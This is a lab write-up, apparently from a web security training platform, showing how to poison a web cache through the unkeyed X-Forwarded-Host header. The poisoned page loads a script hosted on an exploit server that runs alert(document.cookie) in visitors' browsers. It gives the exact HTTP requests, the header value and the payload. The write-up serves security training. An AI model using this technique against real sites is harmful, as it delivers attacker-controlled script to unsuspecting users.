## Web cache poisoning with an unkeyed header

This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

Hint : 

This lab supports the X-Forwarded-Host header.

## Notes

- Exploit server
- /login
- X-Cache Header
- Cache-Control Header
- /resources/js/tracking.js

## Resume

1. Find cached request
2. Exploit the XSS with custom header
3. Store payload on exploit server
4. Deliver exploit to victim

## Solve

The first step is to find a cached request, in this lab the home page has a cached HTTPS response : 

```http
GET / HTTP/2
Host: 0af200f603618ca78012216700f90047.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 11
X-Cache: hit
Content-Length: 11119
```

If we now add the `X-Forwarded-Host` header and resend a request, we can see that our domain is reflected inside the path of the `/resources/js/tracking.js` files : 

```http
GET / HTTP/2
Host: 0af200f603618ca78012216700f90047.web-security-academy.net
X-Forwarded-Host: exploit-0a47004f030e8cda800d20a701d8001d.exploit-server.net
```

```js
<script type="text/javascript" src="//exploit-0a47004f030e8cda800d20a701d8001d.exploit-server.net/resources/js/tracking.js"></script>
```

We can now go to the exploit server store our payload with the file name : `/resources/js/tracking.js` : 

```js
alert(document.cookie)
```

Once it's stored, we can send multiple home page request including our `X-Forwarded-Host` header who point on our exploit server and wait for the visitor to access the home page and triger the XSS. 